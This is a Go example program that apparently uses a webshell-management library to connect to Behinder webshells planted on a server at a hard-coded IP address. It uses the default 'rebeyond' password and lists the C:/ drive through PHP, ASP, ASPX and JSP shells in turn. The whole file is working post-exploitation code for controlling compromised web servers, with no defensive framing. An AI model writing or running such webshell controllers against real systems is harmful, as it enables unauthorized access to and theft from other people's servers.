package main

import (
	"fmt"
	"github.com/go0p/wsm"
	"github.com/go0p/wsm/lib/shell"
	"github.com/go0p/wsm/lib/shell/behinder"
	"log"
)

func main() {
	log.SetFlags(log.Lshortfile)
	jspFileOpt()

	fmt.Println("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
	aspFileOpt()

	fmt.Println("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")

	aspxFileOpt()
	fmt.Println("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")

	phpFileOpt()
}

func phpFileOpt() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://139.196.175.86/bx.php",
			Password: "rebeyond",
			Script:   shell.PhpScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	f := &behinder.ListFiles{
		Path: "C:/",
	}
	file, err := bx.FileManagement(f)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(file.ToMap())
}

func aspxFileOpt() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://139.196.175.86:8081/bx.aspx",
			Password: "rebeyond",
			Script:   shell.CsharpScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	f := &behinder.ListFiles{
		Path: "C:/",
	}
	file, err := bx.FileManagement(f)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(file.ToMap())
}

func aspFileOpt() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://139.196.175.86:8081/bx.asp",
			Password: "rebeyond",
			Script:   shell.AspScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	f := &behinder.ListFiles{
		Path: "C:/",
	}
	file, err := bx.FileManagement(f)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(file.ToMap())
}

func jspFileOpt() {
	info := &wsm.BehinderInfo{
		BaseShell: wsm.BaseShell{
			Url:      "http://139.196.175.86:8080/bx.jsp",
			Password: "rebeyond",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
			Headers:  nil,
		}}
	bx, err := wsm.NewBehinder(info)
	if err != nil {
		log.Println(err)
	}
	f := &behinder.ListFiles{
		Path: "C:/",
	}
	file, err := bx.FileManagement(f)
	if err != nil {
		log.Println(err)
	}
	fmt.Println(file.ToMap())
}
